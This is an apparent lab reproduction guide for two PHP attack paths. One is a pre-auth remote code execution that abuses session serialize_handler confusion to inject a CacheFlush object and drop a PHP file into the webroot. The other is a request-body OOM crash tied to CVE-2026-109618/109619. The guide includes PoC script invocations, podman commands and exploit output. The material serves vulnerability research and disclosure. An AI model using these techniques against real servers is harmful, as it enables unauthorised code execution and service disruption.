# Reproducing the two paths over HTTP (no planting)

Both are driven entirely by HTTP requests against the lab. No `podman exec`
writing session files. Teardown: `cd lab && podman compose down -v`.

## Serialize-handler confusion — pre-auth RCE, no LFI (known object-injection class)

**Precondition (server misconfig):** two locations with different
`session.serialize_handler` sharing one `save_path`. The lab sets `/ps/` to
`php_serialize` (`lab/www/ps/.user.ini`) and the root to `php`.

**How it works.** `upload_progress` writes the attacker's upload *filename* into
the session file. Via the `php_serialize` producer there is no `key|` framing, so
when the `php`-handler consumer reads the same session id it splits on the `|`
the attacker put in the filename and `unserialize()`s the tail into a
`CacheFlush` object, whose `__destruct()` writes a PHP file to the webroot.
Double quotes (which `serialize()` needs) are smuggled in by sending `\"` in the
multipart filename — PHP stores them as real quotes.

```bash
python3 poc/rce_handler_confusion.py --sid chaincAAA
#   [1] deliver via producer (php_serialize)
#   [2] trigger via consumer (php handler)
#   [3] execute dropped file:  CHAIN-C-RCE www-data <host>
#   [+] RCE via handler confusion
```

Session IDs must be `[A-Za-z0-9,-]` only (no `_`).

## OOM core — CVE-2026-109618 / 109619 (the novel part)

**No app precondition.** A body larger than `memory_limit` makes PHP OOM while
reading the request, before any user code runs. The lab's OOM target uses a low
`memory_limit` (set `2M` to make it trivial):

```bash
# apache container, add a tiny limit:
podman exec -u root oomlab-apache sh -c 'echo memory_limit=2M > /usr/local/etc/php/conf.d/zzz-oom.ini'
podman restart oomlab-apache

python3 poc/demo_oom.py --url http://127.0.0.1:18081/info.php
#   HTTP 200
#   Allowed memory size of 2097152 bytes exhausted ... in Unknown on line 0
```

`in Unknown on line 0` = the fatal happened during startup, pre-auth, with no
script line executed. On **FPM** the difference between vulnerable and patched is
visible in the worker log:

```bash
podman logs oomlab-fpm | grep 'exited with code'
#   8.3.35 (vulnerable): child exited with code 70   <- worker killed, respawns
#   8.3.36 (patched)   : (nothing)                   <- worker survives
```

Turning that corrupted-state window into code execution is the heap/build-
dependent weaponization that upstream withholds and this repo does not implement.
